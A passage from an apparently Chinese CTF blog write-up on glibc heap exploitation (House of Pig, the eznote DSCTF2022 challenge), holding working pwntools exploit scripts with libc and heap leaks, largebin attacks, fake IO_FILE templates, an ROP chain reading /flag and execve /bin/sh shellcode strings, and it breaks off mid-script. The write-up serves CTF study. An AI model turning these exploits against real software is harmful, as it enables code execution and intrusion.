8</span></span><br><span class="line">    add(<span class="number">0x518</span>, <span class="string">b&#x27;chunk_b&#x27;</span>)  <span class="comment"># 9</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 10</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create largebin chunk</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create fake_chuk</span></span><br><span class="line">    fake_size = <span class="number">0x500</span> + <span class="number">0x430</span> + <span class="number">0x500</span></span><br><span class="line">    fake_head = p64(<span class="number">0</span>) + p64(fake_size + <span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x508</span>, fake_head)   <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify b-&gt;fd == p</span></span><br><span class="line">    fd = p8(<span class="number">0x10</span>) + p8(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x518</span>, fd)          <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify a-&gt;bk == p</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;a2&#x27;</span>)       <span class="comment"># 11</span></span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    bk = p64(<span class="number">0</span>) + p8(<span class="number">0x10</span>) + p8(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x4f8</span>, bk)          <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set next_chunk-&gt;pre_size = chunk-&gt;size</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;victim2&#x27;</span>)  <span class="comment"># 11</span></span><br><span class="line">    pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4f0</span> + p64(fake_size)</span><br><span class="line">    edit(<span class="number">4</span>, pld)    <span class="comment"># off-by-null</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># success</span></span><br><span class="line">    delete(<span class="number">11</span>)  <span class="comment"># the new merged chunk is overlapped with the prev chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    add(<span class="number">0x4f8</span> + <span class="number">0x430</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 12</span></span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    libc_base = uu64() - <span class="number">0x1e4170</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mlibc_base-&gt;0x%x\033[0m&#x27;</span> % libc_base)</span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap         </span></span><br><span class="line">    add(<span class="number">0x4f8</span> + <span class="number">0x420</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 13</span></span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3930</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mheap_base-&gt;0x%x\033[0m&#x27;</span> % heap_base)</span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">    tls_tcache = libc_base + <span class="number">0x1eb578</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mtls_tcache-&gt;0x%x\033[0m&#x27;</span> % tls_tcache)</span><br><span class="line">    io_file_jumps = libc_base + <span class="number">0x1e54c0</span></span><br><span class="line">    io_file_sync = io_file_jumps + <span class="number">0x60</span></span><br><span class="line">    io_helper_jumps = libc_base + <span class="number">0x1e48c0</span>      <span class="comment"># 0x1e4980</span></span><br><span class="line">    setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;\033[32msetcontext-&gt;0x%x\033[0m&#x27;</span> % setcontext)</span><br><span class="line">    success(<span class="string">&#x27;\033[32mio_file_sync-&gt;0x%x\033[0m&#x27;</span> % io_file_sync)</span><br><span class="line">    success(<span class="string">&#x27;\033[32mio_helper_jumps-&gt;0x%x\033[0m&#x27;</span> % io_helper_jumps)</span><br><span class="line"></span><br><span class="line">    p_rdi_r = libc_base + <span class="number">0x000000000002858f</span></span><br><span class="line">    p_rsi_r = libc_base + <span class="number">0x000000000002ac3f</span></span><br><span class="line">    p_rdx_r12_r = libc_base + <span class="number">0x0000000000114161</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mp_rdi_r-&gt;0x%x\033[0m&#x27;</span> % p_rdi_r)</span><br><span class="line">    op = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    rd = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    pt = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;\033[32mop-&gt;0x%x\033[0m&#x27;</span> % op)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># frame = SigreturnFrame()</span></span><br><span class="line">    <span class="comment"># frame.rsp = heap_base + 0x4a60 + 0x20   # orw_addr</span></span><br><span class="line">    <span class="comment"># frame.rip = p_rdi_r + 1                 # ret</span></span><br><span class="line"></span><br><span class="line">    orw = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x4a60</span> + <span class="number">0xa0</span>)</span><br><span class="line">    orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(op)</span><br><span class="line">    orw += p64(p_rdi_r) + p64(<span class="number">3</span>)</span><br><span class="line">    orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x4a60</span> + <span class="number">0x120</span>)</span><br><span class="line">    orw += p64(rd)</span><br><span class="line">    orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x4a60</span> + <span class="number">0x120</span>)</span><br><span class="line">    orw += p64(pt)</span><br><span class="line">    orw += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># largebin attack to tls_tcache</span></span><br><span class="line">    add(<span class="number">0x4c8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 14b </span></span><br><span class="line">    pld = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x430</span>) + p64(<span class="number">501</span>)</span><br><span class="line">    add(<span class="number">0x438</span>, pld)   <span class="comment"># 15</span></span><br><span class="line">    add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 16</span></span><br><span class="line">    add(<span class="number">0x1a8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 17</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    pld = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x510</span>) + p64(<span class="number">0x431</span>)</span><br><span class="line">    pld += p64(libc_base + <span class="number">0x1e3ff0</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0x3510</span>) + p64(tls_tcache - <span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">0x438</span>, pld)         <span class="comment"># 14</span></span><br><span class="line">    delete(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake tcache_struct</span></span><br><span class="line">    add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    top_chunk = heap_base + <span class="number">0xa0e0</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mtop_chunk-&gt;0x%x\033[0m&#x27;</span> % top_chunk)</span><br><span class="line">    pld = p64(<span class="number">0</span>) * <span class="number">4</span> + <span class="string">b&#x27;\x01&#x27;</span> * <span class="number">0x80</span> </span><br><span class="line">    pld += p64(io_file_sync) * <span class="number">20</span> </span><br><span class="line">    pld += p64(io_helper_jumps + <span class="number">0xa0</span>) * <span class="number">10</span></span><br><span class="line">    pld += p64(top_chunk) * <span class="number">10</span> </span><br><span class="line">    add(<span class="number">0x438</span>, pld)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x518</span>, orw)                     <span class="comment"># orw</span></span><br><span class="line">    add(<span class="number">0x108</span>, p64(setcontext + <span class="number">61</span>))    <span class="comment"># io_file_syn -&gt; setcontext + 61</span></span><br><span class="line">    add(<span class="number">0x188</span>, p64(heap_base + <span class="number">0x4a60</span> + <span class="number">0x20</span>) + p64(p_rdi_r + <span class="number">1</span>))     <span class="comment"># io_helper_jumps + 0xa8 &amp; 0xa0 -&gt; rop_init</span></span><br><span class="line">    add(<span class="number">0x228</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x520</span>))     <span class="comment"># top_chunk.size -&gt; 0x520</span></span><br><span class="line"></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(: Size: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            sh = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">            pwn()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            sh.close()</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure>

<p>攻击成功时也是会返给我们断言的信息的，这也可以帮助我们检查是不是触发了断言，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始爆破</span></span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1089)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1091</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1091)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1093</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1093)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1095</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1095)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1097</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1097)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1099</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1099)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1101</span><br><span class="line">exp.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  uu64    = lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">[+] libc_base-&gt;0x7f81b31a4000</span><br><span class="line">[+] heap_base-&gt;0x55958ac4d000</span><br><span class="line">[+] tls_tcache-&gt;0x7f81b338f578</span><br><span class="line">[+] setcontext-&gt;0x7f81b31f7030</span><br><span class="line">[+] io_file_sync-&gt;0x7f81b3389520</span><br><span class="line">[+] io_helper_jumps-&gt;0x7f81b33888c0</span><br><span class="line">[+] p_rdi_r-&gt;0x7f81b31cc58f</span><br><span class="line">[+] op-&gt;0x7f81b32ac9b0</span><br><span class="line">[+] top_chunk-&gt;0x55958ac570e0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返还给我们断言信息</span></span><br><span class="line">main: malloc.c:2394: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27; failed.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">成功</span></span><br><span class="line">flag&#123;!!success!!&#125;		</span><br></pre></td></tr></table></figure>



<h2 id="House-Of-Pig"><a href="#House-Of-Pig" class="headerlink" title="House_Of_Pig"></a>House_Of_Pig</h2><h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要适用于程存在calloc，无法从tcache中拿取chunk，核心是利用<code>_IO_str_jumps</code>中的<code>_IO_str_overflow</code>函数执行一系列的malloc、memcpy和free操作，主要的攻击思路会在例题中给出，先看一下源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1</span></span><br><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="comment">// #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"> </span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 核心部分，在构造的同时注意绕过检查</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">char</span> *new_buf;</span><br><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br></pre></td></tr></table></figure>

<h3 id="eznote-DSCTF2022"><a href="#eznote-DSCTF2022" class="headerlink" title="eznote(DSCTF2022)"></a>eznote(DSCTF2022)</h3><p>程序存在一个数组的越界，导致在分配最后一个chunk的时候会将第一个chunk的size改写产生了堆叠，并且程序是通过calloc来分配堆块，不会直接从tcache中拿取chunk，并且存在沙盒只能orw。</p>
<p>主要的攻击思路：</p>
<ol>
<li>通过数组越界布置堆风水，泄露libc和heap的地址</li>
<li>largebin_attack劫持<code>_IO_list_all</code>，为构造IO_FILE做准备</li>
<li>进行4次IO_FILE的布局，也是本题的核心思路。第一个FILE用于将tcache_struct释放进入tcache中，也就是<code>heap_base + 0x10</code>的地方；第二次的FILE用于修改tcache_struct使得可以任意地址写；第三个FILE用于修改<code>memcpy@got</code>为system，注意这里要还原memset函数，因为memcpy函数结束之后还会调用memset；第四个FILE触发攻击。</li>
</ol>
<p>总结了一下构造此类FILE的模板：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE1.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE1.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE1.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br></pre></td></tr></table></figure>

<p>学习了e4l4师傅的WP，并做了一点注释：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">b&quot;./eznote&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./eznote&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./eznote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># make overlapping</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0xca1</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 7</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&#x27;Note3:\n&#x27;</span>)</span><br><span class="line">key = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x219ce0</span></span><br><span class="line">io_list_all = libc_base + <span class="number">0x21a680</span></span><br><span class="line">io_str_jumps = libc_base + <span class="number">0x2166c0</span></span><br><span class="line">system = libc_base + <span class="number">0x50d60</span></span><br><span class="line">memcpy_got = libc_base + <span class="number">0x219160</span></span><br><span class="line">memset = libc_base + libc.sym[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;memcpy_got&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;memset&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin_attack</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span 